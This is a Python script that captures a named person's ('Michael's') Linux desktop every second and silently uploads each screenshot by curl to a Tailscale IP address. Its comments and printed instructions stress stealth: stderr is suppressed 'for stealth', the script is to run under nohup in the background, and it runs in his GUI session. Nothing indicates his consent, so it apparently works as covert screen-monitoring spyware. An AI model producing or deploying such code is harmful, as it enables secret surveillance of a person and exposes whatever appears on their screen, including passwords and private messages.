import subprocess
import os
import time
import sys

# --- Configuration ---
RECEIVER_TAILSCALE_IP = '100.96.244.18' # Your PC's Tailscale IP (from your Tailscale console)
RECEIVER_PORT = 8000 # Must match the port the receiver's HTTP server is listening on
FPS = 1 # Frames per second (e.g., 1 for 1 FPS, 2 for 2 FPS)
JPEG_QUALITY = 60 # JPEG quality (0-100). 60-75 is a good balance for compression/quality.

CAPTURE_DIR = "/tmp" # Temporary directory for screenshots
SCREENSHOT_NAME = "remote_screen.jpeg" # Filename for the screenshot
FULL_PATH = os.path.join(CAPTURE_DIR, SCREENSHOT_NAME)

# Calculate delay in seconds for desired FPS
DELAY_SECONDS = 1 / FPS

def run_command(command_args, capture_output_and_check=False, suppress_stderr_if_no_error=True):
    """
    Helper function to run shell commands using subprocess.run().
    command_args: List of command and its arguments.
    capture_output_and_check: If True, stdout and stderr are captured, and an error is raised on non-zero exit.
                              Otherwise, outputs are streamed/printed, and an error is raised on non-zero exit.
    suppress_stderr_if_no_error: If True, stderr is redirected to /dev/null if the command succeeds.
                                 If the command fails, stderr is always captured and printed.
    """
    current_env = os.environ.copy() # Explicitly copy the current environment

    try:
        if capture_output_and_check:
            # When check=True and capture_output=True, stdout and stderr are captured.
            result = subprocess.run(command_args, capture_output=True, text=True, check=True, env=current_env)
            return result.stdout.strip()
        else:
            # Here, we don't use capture_output=True if we want to print or suppress selectively.
            # Instead, we define stdout/stderr behavior.
            stdout_target = subprocess.PIPE # Always capture stdout to print if needed
            stderr_target = subprocess.DEVNULL if suppress_stderr_if_no_error else subprocess.PIPE
            
            result = subprocess.run(command_args, stdout=stdout_target, stderr=stderr_target, text=True, check=True, env=current_env)
            
            if result.stdout:
                print(f"Command STDOUT: {result.stdout.strip()}")
            
            if result.stderr:
                # If command succeeded and we wanted to suppress stderr for success, this means stderr had unexpected output
                if result.returncode == 0 and suppress_stderr_if_no_error:
                    print(f"Command unexpectedly produced STDERR: {result.stderr.strip()}")
                else: # Command failed or we explicitly wanted to see stderr
                    print(f"Command STDERR: {result.stderr.strip()}")
            
            return True
    except subprocess.CalledProcessError as e:
        print(f"Command failed with exit code {e.returncode}: {' '.join(e.cmd)}")
        print(f"STDOUT: {e.stdout.strip()}")
        print(f"STDERR: {e.stderr.strip()}") # Always print stderr on failure for debugging
        return False
    except FileNotFoundError:
        print(f"Error: Command '{command_args[0]}' not found. Please ensure it's installed and in PATH for Michael's user.")
        return False
    except Exception as e:
        print(f"An unexpected error occurred while running command '{command_args[0]}': {e}")
        return False

def check_dependencies():
    """
    Checks if gnome-screenshot and curl are available.
    """
    print("Checking dependencies...")
    # For 'which' command, we explicitly want its output, so capture_output_and_check=True
    if not run_command(["which", "gnome-screenshot"], capture_output_and_check=True):
        print("Error: 'gnome-screenshot' not found in PATH. Ensure it's installed and you're running this script as the correct user.")
        sys.exit(1)
    if not run_command(["which", "curl"], capture_output_and_check=True):
        print("Error: 'curl' not found in PATH. Ensure it's installed.")
        sys.exit(1)
    print("Dependencies checked successfully.")


def send_screen_data():
    """
    Continuously captures, sends, and deletes screenshots.
    """
    check_dependencies()
    print(f"Starting screen sharing sender to {RECEIVER_TAILSCALE_IP}:{RECEIVER_PORT} at {FPS} FPS...")
    
    while True:
        start_time = time.time()
        
        # 1. Take screenshot with gnome-screenshot
        screenshot_command_args = [
            "gnome-screenshot",
            "-f", FULL_PATH,
            "-e", # Entire screen
            "-j", # JPEG format
            "-q", str(JPEG_QUALITY) # Quality
        ]
        
        print(f"Capturing screen to {FULL_PATH} with gnome-screenshot...")
        # gnome-screenshot can be noisy on stderr even when successful, so we suppress it for stealth.
        # If it fails, run_command will catch the non-zero exit code and print full error.
        capture_success = run_command(screenshot_command_args, suppress_stderr_if_no_error=True)

        if capture_success and os.path.exists(FULL_PATH) and os.path.getsize(FULL_PATH) > 0:
            print("Screenshot taken successfully.")

            # 2. Send the image to the receiver using curl
            curl_command_args = [
                "curl",
                "-s", # Silent mode (don't show progress meter)
                "-X", "PUT",
                "--data-binary", f"@{FULL_PATH}",
                f"http://{RECEIVER_TAILSCALE_IP}:{RECEIVER_PORT}/{SCREENSHOT_NAME}"
            ]
            
            print(f"Sending image to {RECEIVER_TAILSCALE_IP}:{RECEIVER_PORT}...")
            # For curl, we want to see stderr if there's a problem, so don't suppress.
            send_success = run_command(curl_command_args, suppress_stderr_if_no_error=False) 

            if send_success:
                print("Image sent successfully.")
            else:
                print("Failed to send image via curl.")
        else:
            print("Screenshot capture failed. This could be due to a locked screen, no active GUI session, or insufficient permissions.")
            print("Ensure Michael is logged into the graphical desktop and that 'gnome-screenshot' works manually as his user.")
            
        # 3. Delete the temporary screenshot file
        if os.path.exists(FULL_PATH):
            try:
                os.remove(FULL_PATH)
                print(f"Deleted temporary file: {FULL_PATH}")
            except OSError as e:
                print(f"Error deleting file {FULL_PATH}: {e}")
        else:
            print(f"File {FULL_PATH} did not exist to delete (likely due to failed capture).")


        # Control frame rate
        end_time = time.time()
        elapsed_time = end_time - start_time
        sleep_time = DELAY_SECONDS - elapsed_time

        if sleep_time > 0:
            time.sleep(sleep_time)
        
        print(f"Frame processed in {elapsed_time:.2f}s. Sleeping for {max(0, sleep_time):.2f}s.")

if __name__ == "__main__":
    print("\n----------------------------------------------------------------------")
    print("              TAILSCALE SCREEN SHARE SENDER SCRIPT")
    print("----------------------------------------------------------------------")
    print("1. **CRITICAL: Ensure Michael is LOGGED INTO THE ZORIN OS GRAPHICAL DESKTOP.**")
    print("   This script captures his live screen.")
    print("2. **ABSOLUTELY DO NOT USE 'sudo' TO RUN THIS SCRIPT.**")
    print("   Running with 'sudo' will prevent access to Michael's graphical display.")
    print("   Run this script from a **TERMINAL OPENED WITHIN HIS ZORIN GUI SESSION.**")
    print("3. To run silently in the background after starting, use:")
    print("   `nohup python3 sender_script.py &` then you can close the terminal.")
    print("----------------------------------------------------------------------\n")
    send_screen_data()